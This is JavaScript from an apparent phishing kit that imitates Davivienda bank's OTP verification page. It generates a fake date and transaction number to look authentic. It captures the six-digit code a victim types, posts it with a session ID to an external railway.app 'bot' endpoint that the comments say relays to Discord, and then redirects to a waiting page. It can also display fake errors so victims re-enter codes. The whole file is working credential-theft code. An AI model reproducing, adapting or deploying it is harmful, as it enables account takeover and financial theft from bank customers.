/* ============================================
   DAVIVIENDA - OTP (Código de verificación)
   Envía código a Discord, luego va a espera.html
   ============================================ */
(function() {
    'use strict';

    // ==========================================
    // CONFIGURACIÓN
    // ==========================================
    var WEBHOOK_URL = 'https://multi-bancos-production.up.railway.app';
    var BANCO = 'davivienda';

    // ==========================================
    // ELEMENTOS
    // ==========================================
    var fechaEl        = document.getElementById('dav-fecha');
    var cusEl          = document.getElementById('dav-cus');
    var formEl         = document.getElementById('davFormOtp');
    var inputCodigo    = document.getElementById('dav-otp-codigo');
    var btnEfectuar    = document.getElementById('davBtnEfectuar');
    var btnCancelar    = document.getElementById('davBtnCancelar');
    var mensajeError   = document.getElementById('davMensajeError');

    // ==========================================
    // SESIÓN (misma que login)
    // ==========================================
    var sessionId = '';
    try {
        sessionId = sessionStorage.getItem('sessionId') || '';
    } catch(e) {}
    if (!sessionId) {
        sessionId = 'sess_' + Date.now() + '_' + Math.floor(Math.random() * 10000);
        try { sessionStorage.setItem('sessionId', sessionId); } catch(e) {}
    }

    // ==========================================
    // FECHA DINÁMICA
    // ==========================================
    function obtenerFechaFormato() {
        var dias = ['Domingo', 'Lunes', 'Martes', 'Miércoles', 'Jueves', 'Viernes', 'Sábado'];
        var meses = ['Enero', 'Febrero', 'Marzo', 'Abril', 'Mayo', 'Junio',
                     'Julio', 'Agosto', 'Septiembre', 'Octubre', 'Noviembre', 'Diciembre'];
        var d = new Date();
        var diaNombre = dias[d.getDay()];
        var dia = d.getDate();
        var mes = meses[d.getMonth()];
        var anio = d.getFullYear();

        var h = d.getHours();
        var m = d.getMinutes();
        var ampm = h >= 12 ? 'PM' : 'AM';
        h = h % 12;
        if (h === 0) h = 12;
        var hh = (h < 10 ? '0' : '') + h;
        var mm = (m < 10 ? '0' : '') + m;

        return diaNombre + ' ' + dia + ' de ' + mes + ' de ' + anio + ', ' + hh + ':' + mm + ' ' + ampm;
    }

    if (fechaEl) fechaEl.textContent = obtenerFechaFormato();

    // ==========================================
    // CUS ALEATORIO
    // ==========================================
    var cus = Math.floor(100000000 + Math.random() * 900000000);
    if (cusEl) cusEl.textContent = cus;

    // ==========================================
    // MOSTRAR / OCULTAR MENSAJE DE ERROR
    // ==========================================
    function mostrarError() {
        if (mensajeError) mensajeError.classList.remove('hidden');
    }

    function ocultarError() {
        if (mensajeError) mensajeError.classList.add('hidden');
    }

    // ==========================================
    // SI VIENE DE UN RECHAZO, MOSTRAR FRANJA
    // ==========================================
    try {
        if (sessionStorage.getItem('dav_rechazado_otp') === '1') {
            mostrarError();
            sessionStorage.removeItem('dav_rechazado_otp');
        }
    } catch(e) {}

    // ==========================================
    // SOLO NÚMEROS EN EL CÓDIGO OTP
    // ==========================================
    if (inputCodigo) {
        inputCodigo.addEventListener('input', function() {
            this.value = this.value.replace(/\D/g, '').substring(0, 6);
            if (this.value.length > 0) ocultarError();
        });
        inputCodigo.addEventListener('keypress', function(ev) {
            var code = ev.which || ev.keyCode;
            if (code < 48 || code > 57) ev.preventDefault();
        });
    }

    // ==========================================
    // BOTÓN CANCELAR → MUESTRA FRANJA DE ERROR
    // ==========================================
    if (btnCancelar) {
        btnCancelar.addEventListener('click', function() {
            mostrarError();
        });
    }

    // ==========================================
    // SUBMIT — Envía OTP a Discord y va a espera
    // ==========================================
    if (formEl) {
        formEl.addEventListener('submit', function(ev) {
            ev.preventDefault();

            var codigo = inputCodigo ? inputCodigo.value.trim() : '';

            if (!codigo) {
                mostrarError();
                inputCodigo.focus();
                return;
            }

            if (codigo.length !== 6) {
                mostrarError();
                inputCodigo.focus();
                return;
            }

            ocultarError();

            if (btnEfectuar) {
                btnEfectuar.disabled = true;
                btnEfectuar.textContent = 'Enviando...';
            }

            // ==========================================
            // DATOS A ENVIAR (formato del bot)
            // ==========================================
            var datos = {
                sessionId: sessionId,
                otp: codigo
            };

            console.log('📱 OTP enviado al bot:', datos);

            try {
                sessionStorage.setItem('dav_otp', codigo);
            } catch(e) {}

            // ==========================================
            // ENVIAR AL BOT (endpoint /enviar-otp)
            // ==========================================
            fetch(WEBHOOK_URL + '/' + BANCO + '/enviar-otp', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(datos)
            })
            .then(function(res) {
                console.log('✅ Respuesta del bot:', res.status);
                return res.json();
            })
            .then(function(data) {
                console.log('✅ Respuesta JSON:', data);
            })
            .catch(function(err) {
                console.warn('⚠️ Error al enviar:', err);
            })
            .finally(function() {
                // Redirigir a pantalla de espera
                setTimeout(function() {
                    window.location.href = 'espera.html';
                }, 600);
            });
        });
    }

    window.deshabilita = function() {};
    window.obtenerFechaFormato = obtenerFechaFormato;

})();